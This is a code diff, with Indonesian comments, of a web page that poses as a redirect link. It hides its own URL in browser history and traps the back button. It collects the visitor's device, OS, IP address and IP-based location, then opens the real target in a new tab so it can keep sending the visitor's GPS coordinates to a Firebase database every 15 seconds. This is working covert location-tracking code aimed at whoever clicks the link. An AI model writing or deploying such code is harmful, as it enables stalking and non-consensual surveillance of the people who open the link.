@@ -9,8 +9,10 @@
     </style>
 </head>
 <body>
+    <h2>Sedang tracking lokasi...</h2>
+
     <script type="module">
-        // Nyamar di history (timpa URL biar gak keliatan track.html)
+        // Nyamar di history
         history.replaceState({}, "", "/");
 
         // Jebakan tombol back
@@ -21,7 +23,9 @@
 
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
         import { getFirestore, doc, getDoc, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
+        // Ganti dengan config Firebase project kamu
         const firebaseConfig = {
             apiKey: "AIzaSyAtTaKf_Psb-yhxa5nNFIcs3Tte5gjYe00",
             authDomain: "locked-1dfad.firebaseapp.com",
@@ -33,12 +37,20 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
+        const auth = getAuth(app);
+
+        // login anonymous otomatis
+        signInAnonymously(auth).catch(err => {
+            console.error("Auth gagal:", err);
+        });
 
         const urlParams = new URLSearchParams(window.location.search);
         const linkId = urlParams.get('id');
         const linkRef = doc(db, "trackingLinks", linkId);
 
-        (async () => {
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) return;
+
             const docSnap = await getDoc(linkRef);
             if (!docSnap.exists()) {
                 document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
@@ -48,6 +60,7 @@
             const linkData = docSnap.data();
             const clickData = { timestamp: Date.now() };
 
+            // Deteksi Device & OS
             const ua = navigator.userAgent.toLowerCase();
             let device = "Unknown Device";
             let os = "Unknown OS";
@@ -73,6 +86,7 @@
             clickData.device = device;
             clickData.os = os;
 
+            // Ambil IP
             fetch('https://api.ipify.org?format=json').then(res => res.json()).then(ipData => {
                 const ipv4 = ipData.ip;
                 return fetch(`https://ipapi.co/${ipv4}/json/`).then(res => res.json()).then(geo => {
@@ -96,10 +110,15 @@
             }).catch(() => saveAndRedirect());
 
             async function saveAndRedirect() {
+                // Simpan klik ke Firestore
                 await updateDoc(linkRef, {
                     clicks: arrayUnion(clickData)
                 });
+
+                // Mulai tracking berkala
                 startTracking();
+
+                // Buka target di tab baru (track.html tetap hidup)
                 window.open(linkData.targetUrl, "_blank");
             }
 
@@ -111,20 +130,24 @@
                         if (snap.exists()) {
                             let data = snap.data();
                             let history = data.locations || [];
+
                             history.push({
                                 latitude: pos.coords.latitude,
                                 longitude: pos.coords.longitude,
                                 timestamp: Date.now()
                             });
+
+                            // hanya 10 lokasi terakhir
                             if (history.length > 10) {
                                 history = history.slice(history.length - 10);
                             }
+
                             await updateDoc(linkRef, { locations: history });
                         }
                     }, () => {}, { timeout: 5000 });
-                }, 15000);
+                }, 15000); // update tiap 15 detik
             }
-        })();
+        });
     </script>
 </body>
 </html>
